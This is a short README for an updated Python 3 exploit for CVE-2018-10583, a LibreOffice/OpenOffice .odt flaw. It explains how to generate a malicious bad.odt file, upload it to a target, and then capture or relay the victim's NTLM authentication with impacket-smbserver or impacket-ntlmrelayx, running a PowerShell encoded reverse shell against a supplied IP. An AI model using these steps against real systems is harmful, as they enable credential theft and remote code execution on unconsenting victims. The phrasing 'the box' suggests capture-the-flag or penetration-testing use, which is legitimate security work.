# Updated python3 exploit for [CVE-2018-10583](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10583) (LibreOffice/Open Office - '.odt' Information Disclosure)
> original credits to : https://www.exploit-db.com/exploits/44564
## Usage
1. Install ezodf module with `pip` or `pip3`
2. Run the exploit with `python3` it will generate a bad.odt file, upload it to the box
3. And then listen for requests to your smb server `impacket-smbserver share share -smb2support` or `sudo impacket-ntlmrelayx --no-http-server -smb2support -t <your_ip>
-c "powershell -enc <one liner rever shell>"`
